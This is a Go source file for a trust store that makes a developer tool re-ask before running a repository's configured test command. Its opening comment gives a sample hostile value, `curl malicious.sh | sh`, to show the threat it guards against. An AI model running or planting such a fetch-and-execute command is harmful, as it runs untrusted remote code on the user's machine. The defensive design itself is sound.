// Package trust manages per-repo trust for running test_cmd during
// task execution. Trust intentionally lives OUTSIDE the repo (in
// ~/.skep/trusted-repos.json) so a `.skep/config.json` committed into
// a cloned repository cannot unilaterally enable test_cmd execution on
// a collaborator's machine. A teammate's PR that changes test_cmd to
// `curl malicious.sh | sh` will fail to run until the local user
// re-runs `skep init` and explicitly acknowledges the new value.
package trust

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sync"
	"time"
)

// Entry is one trusted repo record.
type Entry struct {
	Path        string    `json:"path"`          // absolute repo path
	TestCmdHash string    `json:"test_cmd_hash"` // sha256 of the test_cmd at trust time
	TrustedAt   time.Time `json:"trusted_at"`
}

// file is the on-disk layout: list of entries.
type file struct {
	Entries []Entry `json:"entries"`
}

// mu guards read-modify-write races. The file is small (~few KB at
// the extreme upper bound) so we re-serialize the whole list on each
// write — no partial updates, no fsync races.
var mu sync.Mutex

// Path returns the absolute location of the trust store.
// ~/.skep/trusted-repos.json. Creates parent dirs on demand.
func Path() (string, error) {
	home, err := os.UserHomeDir()
	if err != nil {
		return "", fmt.Errorf("trust: home dir: %w", err)
	}
	dir := filepath.Join(home, ".skep")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		return "", fmt.Errorf("trust: mkdir: %w", err)
	}
	return filepath.Join(dir, "trusted-repos.json"), nil
}

// hashCmd returns a stable fingerprint of a test_cmd string. We hash
// the raw bytes — any whitespace or flag change will re-prompt.
func hashCmd(testCmd string) string {
	h := sha256.Sum256([]byte(testCmd))
	return hex.EncodeToString(h[:])
}

// load reads the trust file, returning an empty file if it does not
// exist. Never errors on ENOENT — a missing file means "nothing is
// trusted yet," which is the safe default.
func load() (*file, error) {
	path, err := Path()
	if err != nil {
		return nil, err
	}
	b, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return &file{}, nil
		}
		return nil, fmt.Errorf("trust: read: %w", err)
	}
	var f file
	if err := json.Unmarshal(b, &f); err != nil {
		return nil, fmt.Errorf("trust: parse: %w", err)
	}
	return &f, nil
}

// save writes the trust file with 0600 perms. Atomic: write to temp,
// rename. Survives crashes mid-write without corrupting the store.
func save(f *file) error {
	path, err := Path()
	if err != nil {
		return err
	}
	tmp := path + ".tmp"
	data, err := json.MarshalIndent(f, "", "  ")
	if err != nil {
		return fmt.Errorf("trust: marshal: %w", err)
	}
	if err := os.WriteFile(tmp, data, 0o600); err != nil {
		return fmt.Errorf("trust: write: %w", err)
	}
	if err := os.Rename(tmp, path); err != nil {
		return fmt.Errorf("trust: rename: %w", err)
	}
	return nil
}

// IsAllowed reports whether the given (repoRoot, testCmd) pair is
// currently trusted. The testCmd hash must match the value the user
// trusted at init time — if the cmd has changed since then, this
// returns false and the caller should refuse to run it.
//
// repoRoot is resolved to an absolute path internally so callers don't
// need to normalize. A zero-value/empty testCmd is always trusted
// (nothing will actually execute).
func IsAllowed(repoRoot, testCmd string) (bool, error) {
	if testCmd == "" {
		return true, nil
	}
	abs, err := filepath.Abs(repoRoot)
	if err != nil {
		return false, err
	}
	mu.Lock()
	defer mu.Unlock()
	f, err := load()
	if err != nil {
		return false, err
	}
	want := hashCmd(testCmd)
	for _, e := range f.Entries {
		if e.Path == abs && e.TestCmdHash == want {
			return true, nil
		}
	}
	return false, nil
}

// MarkTrusted records that the user has explicitly approved running
// the given testCmd in the given repo. Idempotent: re-calling with
// the same (path, cmd) updates the timestamp but keeps one entry.
// Changing the cmd replaces the stored hash.
//
// Called by `skep init` after the user confirms the test command
// interactively. Also called by any future `skep trust` subcommand.
func MarkTrusted(repoRoot, testCmd string) error {
	abs, err := filepath.Abs(repoRoot)
	if err != nil {
		return err
	}
	mu.Lock()
	defer mu.Unlock()
	f, err := load()
	if err != nil {
		return err
	}
	h := hashCmd(testCmd)
	now := time.Now().UTC()
	for i, e := range f.Entries {
		if e.Path == abs {
			f.Entries[i] = Entry{Path: abs, TestCmdHash: h, TrustedAt: now}
			return save(f)
		}
	}
	f.Entries = append(f.Entries, Entry{Path: abs, TestCmdHash: h, TrustedAt: now})
	return save(f)
}

// Revoke removes the trust entry for a repo. No-op if the repo isn't
// in the store.
func Revoke(repoRoot string) error {
	abs, err := filepath.Abs(repoRoot)
	if err != nil {
		return err
	}
	mu.Lock()
	defer mu.Unlock()
	f, err := load()
	if err != nil {
		return err
	}
	kept := f.Entries[:0]
	for _, e := range f.Entries {
		if e.Path != abs {
			kept = append(kept, e)
		}
	}
	f.Entries = kept
	return save(f)
}
